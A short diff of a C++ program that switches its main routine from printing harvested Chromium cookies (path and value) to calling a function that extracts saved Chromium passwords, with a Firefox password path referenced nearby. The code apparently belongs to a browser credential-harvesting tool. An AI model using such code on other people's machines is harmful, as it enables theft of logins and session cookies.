@@ -23,6 +23,7 @@ int main()
 #endif
         ChromiumProcessor chrProc1;
 
+        /*
         chrProc1.ExtractChromiumCookies();
 
         for(unsigned long int i=0; i<chrProc1.Cookies->size(); i++)
@@ -32,7 +33,8 @@ int main()
             cout<<chrProc1.Cookies->at(i).Path<<" | ";
             cout<<chrProc1.Cookies->at(i).Value<<"\n";
         }
-
+*/
+        chrProc1.ExtractChromiumPasswords();
 /*
         if(experimental::filesystem::exists(firefox_pass_path))
         {
